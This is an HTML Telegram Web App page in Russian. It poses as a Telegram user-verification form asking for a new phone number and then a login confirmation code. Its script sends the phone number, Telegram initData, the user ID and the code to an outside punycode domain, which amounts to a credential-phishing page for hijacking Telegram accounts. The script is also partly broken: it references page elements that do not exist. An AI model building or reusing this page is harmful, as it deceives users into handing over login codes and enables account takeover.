<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка пользователя Телеграмм</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: white; /* Изменили цвет фона на белый */
        }

        .tg-icon {
            font-size: 36px;
            color: #0074b9;
            margin-bottom: 20px;
        }

        h1 {
            margin-top: 0;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        label {
            margin-top: 10px;
        }

        input {
            margin-bottom: 10px;
            padding: 5px;
            width: calc(100% - 10px);
        }

        button {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Голубая иконка с надписью TG -->
    <div class="tg-icon">TG</div>

    <!-- Название страницы -->
    <h1>Проверка пользователя Телеграмм</h1>

    <!-- Страница для ввода номера телефона -->
    <form id="phoneForm">
        <label for="newPhone">Новый номер телефона:</label>
        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
        <br>
        <button id="nextBtn" type="submit">Далее</button>
    </form>

    <!-- Страница для ввода кода подтверждения -->
    <form id="codeForm">
        <label for="code">Код подтверждение:</label>
        <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
        <br>
        <button id="sendBtn" type="submit">Войти</button>
    </form>

    <script>
        const tg = window.Telegram.WebApp;

        document.getElementById('nextBtn').addEventListener('click', async () => {
            const userValue = document.getElementById('newPhone').value;

            const payload = {
                value: userValue,
                initData: tg.initData, // Данные авторизации пользователя от Telegram
                userId: tg.initDataUnsafe?.user?.id
            };

            try {
                // Отправляем данные на ваш сервер без закрытия приложения
                const response = await fetch('https://xn----7sbfcob9ece2e.com', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    // Скрываем первую страницу и показываем вторую
                    document.getElementById('page-1').style.display = 'none';
                    document.getElementById('page-2').style.display = 'block';

                    // Скрываем кнопку "Далее" на первой странице.
                    document.getElementById('nextBtn').style.display = 'none';
                    // Показываем кнопку "Войти" на второй странице.
                    document.getElementById('sendBtn').style.display = 'block';
                } else {
                    alert('Ошибка при сохранении данных на сервере');
                }
            } catch (error) {
                console.error('Ошибка сети:', error);
                alert('Не удалось отправить данные');
            }
        });

        document.getElementById('sendBtn').addEventListener('click', async () => {
            const code = document.getElementById('code').value;

            // Отправляем код на ваш сервер, если нужно.
            const response = await fetch('https://xn----7sbfcob9ece2e.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ code })
            });

            if (response.ok) {
                alert('Вход выполнен успешно!');
            } else {
                alert('Неверный код подтверждения.');
            }
        });
    </script>

</body>
</html>
